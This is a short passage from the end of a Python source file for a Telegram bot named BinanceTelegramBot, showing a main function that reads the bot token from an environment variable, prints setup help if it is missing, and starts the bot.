        self.application.run_polling()


def main():
    """Main function"""
    # Get bot token from environment variable
    BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
    
    if not BOT_TOKEN:
        logger.error("TELEGRAM_BOT_TOKEN environment variable not set!")
        print("\n❌ ERROR: TELEGRAM_BOT_TOKEN not found!")
        print("\nPlease set your Telegram bot token:")
        print("export TELEGRAM_BOT_TOKEN='your_bot_token_here'")
        print("\nOr add it to .env file:")
        print("TELEGRAM_BOT_TOKEN=your_bot_token_here")
        return
    
    # Create and run bot
    bot = BinanceTelegramBot(BOT_TOKEN)
    bot.run()


if __name__ == '__main__':
    main()
